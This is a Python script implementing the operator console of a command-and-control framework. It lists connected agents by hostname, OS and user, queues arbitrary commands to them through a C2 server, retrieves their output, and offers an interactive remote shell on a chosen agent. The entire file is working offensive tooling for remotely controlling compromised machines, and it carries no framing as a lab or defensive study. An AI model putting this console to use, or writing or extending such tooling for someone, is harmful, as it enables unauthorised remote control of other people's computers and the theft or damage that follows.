import requests
import json
import time
from rich.console import Console
from rich.table import Table

console = Console()

class C2Handler:
    def __init__(self, server="127.0.0.1", port=8080):
        self.url = f"http://{server}:{port}"

    def list_agents(self):
        """List all connected agents"""
        try:
            r = requests.get(f"{self.url}/agents")
            agents = r.json()
            
            table = Table(title="Connected Agents")
            table.add_column("Agent ID", style="cyan")
            table.add_column("Hostname", style="yellow")
            table.add_column("OS", style="white")
            table.add_column("User", style="green")
            table.add_column("Last Seen", style="blue")
            
            for agent_id, info in agents.items():
                table.add_row(
                    agent_id,
                    info.get('hostname', 'N/A'),
                    info.get('os', 'N/A'),
                    info.get('user', 'N/A'),
                    info.get('last_seen', 'N/A')
                )
            console.print(table)
            return agents
        except Exception as e:
            console.print(f"[red][-] Could not reach C2 server: {e}[/red]")
            return {}

    def send_command(self, agent_id, command):
        """Send command to an agent"""
        try:
            r = requests.post(
                f"{self.url}/cmd",
                json={'agent_id': agent_id, 'command': command}
            )
            if r.status_code == 200:
                console.print(f"[green][+] Command queued: {command}[/green]")
                return True
        except Exception as e:
            console.print(f"[red][-] Failed to send command: {e}[/red]")
        return False

    def get_results(self, agent_id):
        """Get results from an agent"""
        try:
            r = requests.get(f"{self.url}/results/{agent_id}")
            results = r.json()
            for result in results:
                console.print(f"[cyan][{result['timestamp']}][/cyan]")
                console.print(f"[yellow]{result['output']}[/yellow]")
            return results
        except Exception as e:
            console.print(f"[red][-] Failed to get results: {e}[/red]")
            return []

    def interactive_shell(self, agent_id):
        """Interactive shell with an agent"""
        console.print(f"[bold green][+] Interactive shell with {agent_id}[/bold green]")
        console.print(f"[cyan]Type 'exit' to quit, 'results' to see output[/cyan]\n")
        
        while True:
            try:
                cmd = input(f"c2({agent_id})> ").strip()
                
                if cmd == "exit":
                    break
                elif cmd == "results":
                    self.get_results(agent_id)
                elif cmd == "agents":
                    self.list_agents()
                elif cmd:
                    self.send_command(agent_id, cmd)
                    time.sleep(2)  # wait for agent to check in
                    self.get_results(agent_id)
                    
            except KeyboardInterrupt:
                break

    def run_console(self):
        """Main C2 console"""
        console.print(f"\n[bold red]========================[/bold red]")
        console.print(f"[bold red]   C2 HANDLER CONSOLE   [/bold red]")
        console.print(f"[bold red]========================[/bold red]")
        console.print("[cyan]Commands: agents | shell <id> | cmd <id> <command> | exit[/cyan]\n")
        
        while True:
            try:
                inp = input("C2> ").strip()
                
                if not inp:
                    continue
                elif inp == "exit":
                    break
                elif inp == "agents":
                    self.list_agents()
                elif inp.startswith("shell "):
                    agent_id = inp.split(" ")[1]
                    self.interactive_shell(agent_id)
                elif inp.startswith("cmd "):
                    parts = inp.split(" ", 2)
                    if len(parts) >= 3:
                        self.send_command(parts[1], parts[2])
                elif inp.startswith("results "):
                    agent_id = inp.split(" ")[1]
                    self.get_results(agent_id)
                else:
                    console.print("[yellow]Unknown command[/yellow]")
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]Use 'exit' to quit[/yellow]")


if __name__ == "__main__":
    handler = C2Handler(server="127.0.0.1", port=8080)
    handler.run_console()
